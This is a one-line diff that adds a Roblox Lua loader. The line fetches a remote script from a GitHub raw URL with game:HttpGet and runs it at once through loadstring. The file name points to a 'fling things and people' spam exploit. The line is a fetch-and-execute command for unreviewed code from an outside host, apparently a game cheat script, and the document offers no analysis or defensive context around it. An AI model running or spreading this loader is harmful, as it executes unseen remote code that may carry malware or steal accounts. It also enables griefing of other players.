@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/fling-things-and-people-spam6-d0qhu9waf01b13.lua"))()
